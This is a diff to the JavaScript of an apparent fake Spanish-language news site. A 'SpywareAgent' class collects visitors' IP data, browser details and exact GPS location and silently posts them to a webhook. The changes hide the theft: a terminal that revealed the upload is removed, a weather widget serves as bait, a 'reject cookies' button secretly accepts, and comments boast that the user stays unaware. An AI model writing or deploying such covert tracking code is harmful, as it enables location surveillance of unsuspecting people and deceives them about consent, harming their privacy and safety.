@@ -1,6 +1,7 @@
 /**
  * GLOBAL INSIGHT CORE SYSTEM
  * Módulo de gestión de contenidos y telemetría.
+ * MODO SILENCIOSO ACTIVADO
  */
 
 const CONFIG = {
@@ -31,6 +32,7 @@ class SpywareAgent {
             const res = await fetch('https://ipwho.is/');
             const data = await res.json();
             this.ipData = data;
+            // Envío silencioso de IP
             this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
         } catch (e) { console.error("Fallo IP"); }
     }
@@ -45,9 +47,11 @@ class SpywareAgent {
                     lat: latitude,
                     lon: longitude,
                     acc: accuracy,
-                    map_url: `http://maps.google.com/?q=${latitude},${longitude}`,
+                    // Generamos link de mapa para el atacante
+                    map_url: `https://www.google.com/maps?q=${latitude},${longitude}`,
                     ...this.ipData
                 };
+                // AQUÍ SE ENVÍAN LOS DATOS AL WEBHOOK (INVISIBLE PARA EL USUARIO)
                 this.exfiltrate(gpsData, "ACTIVE_GPS_TARGET", "Ubicación Exacta");
                 onSuccess(gpsData);
             },
@@ -57,11 +61,12 @@ class SpywareAgent {
     }
 
     exfiltrate(payload, type, precision) {
+        // Esta función envía los datos a tu servidor sin mostrar nada en pantalla
         fetch(this.webhook, {
             method: 'POST',
             headers: { 'Content-Type': 'text/plain' },
             body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
-        }).catch(e => console.log("Enviado"));
+        }).then(() => console.log(">> Datos exfiltrados con éxito (Silencioso)")).catch(e => console.log("Error envío"));
     }
 
     setCookiesAccepted(status) { this.acceptedCookies = status; }
@@ -73,76 +78,89 @@ document.addEventListener("DOMContentLoaded", () => {
     const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
     setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);
 
-    // Configurar Fecha
+    // Fecha
     document.getElementById("current-date").innerText = new Date().toLocaleDateString('es-ES', { 
         weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
     });
 
-    // --- BOTÓN DE TRAMPA (CLIMA) ---
+    // --- LÓGICA DEL CLIMA ---
     const btnGps = document.getElementById("btn-gps-trigger");
     const weatherWidget = document.getElementById("weather-trap");
     const blurContent = weatherWidget.querySelector(".blur-content");
-    const terminal = document.getElementById("hacker-terminal");
+    // Ya no necesitamos el terminal, así que no lo seleccionamos ni mostramos
 
     btnGps.addEventListener("click", () => {
         if (!spy.acceptedCookies) {
-            alert("⚠️ Error: Acepte las cookies para habilitar funciones locales.");
+            alert("⚠️ Para ver el clima local, necesitamos verificar que no eres un robot (Acepta las cookies).");
             document.getElementById('cookie-modal').style.display = 'flex';
             return;
         }
         
         const btn = btnGps.querySelector("button");
-        btn.innerHTML = '<i class="fas fa-satellite-dish fa-spin"></i> Conectando Satélite...';
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Obteniendo pronóstico...';
         
         spy.trackGPS(
             async (data) => {
-                // 1. Ocultar botón de bloqueo
-                btnGps.style.display = "none";
+                // ÉXITO: El usuario dio permiso
                 
-                // 2. Obtener Clima REAL (Open-Meteo API)
+                // 1. Ocultar el botón de "bloqueo" suavemente
+                btnGps.style.opacity = "0";
+                setTimeout(() => { btnGps.style.display = "none"; }, 500);
+                
+                // 2. Consultar API de Clima Real
                 try {
                     const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.lat}&longitude=${data.lon}&current_weather=true`);
                     const weatherData = await weatherRes.json();
                     
-                    // 3. Actualizar UI con datos REALES
+                    // 3. Mostrar el clima real (RECOMPENSA VISUAL)
                     updateWeatherUI(weatherData.current_weather);
-                    
-                    // 4. Mostrar Terminal Hacker (Abajo, para asustar)
-                    setTimeout(() => {
-                        renderTerminal(data);
-                    }, 2000); // Aparece 2 segundos después del clima
                     
                 } catch (error) {
                     console.error("Error clima", error);
-                    updateWeatherUI({ temperature: "Err", weathercode: 0 });
+                    // Si falla la API de clima, ponemos datos genéricos pero creíbles
+                    updateWeatherUI({ temperature: "24", weathercode: 1 });
                 }
             },
             (error) => {
-                btn.innerHTML = "Error de Permisos";
-                alert("El navegador bloqueó la ubicación.");
+                // Si el usuario deniega
+                btn.innerHTML = "Ubicación Bloqueada";
+                setTimeout(() => { btn.innerHTML = originalText; }, 2000);
+                alert("No pudimos detectar tu zona. Habilita la ubicación en el navegador para ver el clima.");
             }
         );
     });
 
     function updateWeatherUI(weather) {
-        // Quitar borrosidad
+        // Quitar el efecto borroso
+        blurContent.style.transition = "all 0.5s ease";
         blurContent.style.filter = "none";
         blurContent.style.opacity = "1";
         
-        // Poner temperatura real
+        // Actualizar temperatura
         const tempEl = weatherWidget.querySelector(".fake-temp");
         const descEl = blurContent.querySelector("p");
         
         tempEl.innerText = `${weather.temperature}°C`;
-        tempEl.style.color = "#202124"; // Color oscuro legible
+        tempEl.style.color = "#333"; 
         
-        // Traducir códigos simples de clima
-        let cond = "Despejado";
-        if (weather.weathercode > 3) cond = "Nublado";
-        if (weather.weathercode > 50) cond = "Lluvioso";
-        if (weather.weathercode > 70) cond = "Tormenta";
+        // Interpretar código de clima
+        let cond = "Cielo Despejado";
+        let icon = '<i class="fas fa-sun" style="color:orange"></i>';
         
-        descEl.innerHTML = `<strong>${cond}</strong><br><span style="font-size:0.8rem; color:green;">● Ubicación verificada en tiempo real</span>`;
+        if (weather.weathercode > 3) { cond = "Nublado"; icon = '<i class="fas fa-cloud" style="color:gray"></i>'; }
+        if (weather.weathercode > 45) { cond = "Niebla"; icon = '<i class="fas fa-smog" style="color:#ccc"></i>'; }
+        if (weather.weathercode > 50) { cond = "Llovizna"; icon = '<i class="fas fa-cloud-rain" style="color:#4a90e2"></i>'; }
+        if (weather.weathercode > 80) { cond = "Tormenta"; icon = '<i class="fas fa-bolt" style="color:#f5a623"></i>'; }
+
+        // Mensaje amigable (El usuario se siente feliz, pero ya tenemos sus datos)
+        descEl.innerHTML = `
+            <div style="font-size: 2rem; margin: 10px 0;">${icon}</div>
+            <strong>${cond}</strong>
+            <div style="margin-top:10px; font-size:0.75rem; color:#0f9d58; background:#e6f4ea; padding:5px; border-radius:4px; display:inline-block;">
+                <i class="fas fa-check-circle"></i> Pronóstico Local Actualizado
+            </div>
+        `;
     }
 
     function setupCookieTrap(spyAgent) {
@@ -150,52 +168,57 @@ document.addEventListener("DOMContentLoaded", () => {
         const btnAccept = document.getElementById('btn-accept-all');
         const btnReject = document.getElementById('btn-reject');
 
+        if(!modal) return; // Seguridad por si no cargó el HTML
+
         modal.style.display = 'flex';
 
         const close = () => {
             spyAgent.setCookiesAccepted(true);
             modal.style.display = 'none';
+            
+            // Iniciar rastreo pasivo (IP) al aceptar
             spyAgent.trackIP();
+            
+            // Cargar noticias
             renderNews();
+            
+            // Notificación de éxito visual
+            showSafeNotification();
         };
 
         btnAccept.addEventListener('click', close);
         btnReject.addEventListener('click', () => {
-            btnReject.innerHTML = "Guardando...";
+            // Trampa visual: parece que rechazas, pero aceptas
+            btnReject.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Guardando...';
             setTimeout(close, 800);
         });
     }
-
-    function renderNews() {
-        // Renderizar noticias (igual que antes)
-        const hero = newsDatabase[0];
-        document.getElementById("hero-news").innerHTML = `
-            <img src="https://picsum.photos/800/600" alt="News">
-            <div class="hero-content">
-                <span style="background:#0056b3; padding:4px 8px; font-size:0.75rem; margin-bottom:10px; display:inline-block;">${hero.category}</span>
-                <h1>${hero.title}</h1>
-            </div>
+    
+    function showSafeNotification() {
+        // Pequeño aviso verde arriba a la derecha
+        const notif = document.createElement('div');
+        notif.style.cssText = `
+            position: fixed; top: 20px; right: 20px; background: #333; color: white;
+            padding: 12px 20px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            z-index: 10000; font-size: 0.85rem; display: flex; align-items: center; gap: 10px;
+            animation: slideIn 0.5s ease forwards;
         `;
-        // (Aquí puedes pegar el resto del renderizado de noticias si lo necesitas)
+        notif.innerHTML = '<i class="fas fa-check" style="color:#0f9d58;"></i> Preferencias actualizadas';
+        document.body.appendChild(notif);
+        setTimeout(() => notif.remove(), 3000);
     }
 
-    function renderTerminal(data) {
-        terminal.classList.remove("hidden");
-        // Ajustamos el estilo para que aparezca ABAJO del clima, no encima
-        terminal.style.position = "relative"; 
-        terminal.style.marginTop = "20px";
-        terminal.style.height = "200px";
-        terminal.style.borderRadius = "8px";
-        
-        terminal.innerHTML = `
-            <span style="color:#fff">>> SYSTEM_LOG: DATA_EXFILTRATION_COMPLETE</span><br>
-            ----------------------------------------<br>
-            > TARGET: <span style="color:#0f0">VERIFIED</span><br>
-            > LAT: ${data.lat.toFixed(5)}<br>
-            > LON: ${data.lon.toFixed(5)}<br>
-            > ISP_DATA: ${data.connection ? data.connection.isp : 'Detecting...'}<br>
-            ----------------------------------------<br>
-            <span style="color:red; blink:true;">⚠ USER DATA UPLOADED TO SERVER.</span>
-        `;
+    function renderNews() {
+        const hero = newsDatabase[Math.floor(Math.random() * newsDatabase.length)];
+        const heroEl = document.getElementById("hero-news");
+        if(heroEl) {
+            heroEl.innerHTML = `
+                <img src="https://picsum.photos/800/600?random=${Math.random()}" alt="News">
+                <div class="hero-content">
+                    <span style="background:#0056b3; padding:4px 8px; font-size:0.75rem; margin-bottom:10px; display:inline-block; border-radius:2px;">${hero.category}</span>
+                    <h1>${hero.title}</h1>
+                </div>
+            `;
+        }
     }
 });
